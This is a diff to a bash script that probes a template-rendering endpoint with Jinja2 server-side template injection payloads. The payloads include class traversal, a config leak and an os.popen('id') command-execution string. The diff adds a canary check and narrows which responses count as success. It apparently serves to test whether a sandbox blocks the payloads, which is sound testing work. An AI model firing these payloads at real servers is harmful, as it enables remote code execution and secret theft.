@@ -9,14 +9,14 @@ BASE="http://${TARGET_HOST}:${TARGET_PORT}/render"
 SUCCESS=1
 
 payloads=(
+  # canary leak — only available when sandbox is off
+  '{{ssti_canary}}'
   # basic math proof
   '{{7*7}}'
   # class traversal to subprocess
   '{{"".__class__.__mro__[1].__subclasses__()}}'
   # config leak
   '{{config}}'
-  # OS command via Popen
-  '{{"".__class__.__mro__[1].__subclasses__()[0].__init__.__globals__}}'
   # lipsum trick
   '{{lipsum.__globals__["os"].popen("id").read()}}'
 )
@@ -25,14 +25,14 @@ echo "---raw---"
 for i in "${!payloads[@]}"; do
   p="${payloads[$i]}"
   resp=$(curl -sS --max-time 4 -X POST "$BASE" --data-urlencode "template=$p" 2>&1) || true
-  if echo "$resp" | grep -qE '"rendered":\s*"49"'; then
+  if echo "$resp" | grep -qF 'CANARY_SSTI_2b6d4e'; then
+    echo "PAYLOAD[$i] SSTI_CANARY: canary leaked (sandbox off)"
+    SUCCESS=0
+  elif echo "$resp" | grep -qE '"rendered":\s*"49"'; then
     echo "PAYLOAD[$i] SSTI_MATH: 7*7=49 executed"
     SUCCESS=0
-  elif echo "$resp" | grep -qE 'uid=[0-9]+\(|subprocess|Popen|SECRET_KEY'; then
-    echo "PAYLOAD[$i] SSTI_RCE: code execution or config leak"
-    SUCCESS=0
-  elif echo "$resp" | grep -qE '__class__|__subclasses__'; then
-    echo "PAYLOAD[$i] SSTI_INTROSPECT: class traversal returned"
+  elif echo "$resp" | grep -qE 'uid=[0-9]+\('; then
+    echo "PAYLOAD[$i] SSTI_RCE: code execution"
     SUCCESS=0
   else
     echo "PAYLOAD[$i] blocked: ${p:0:60}"
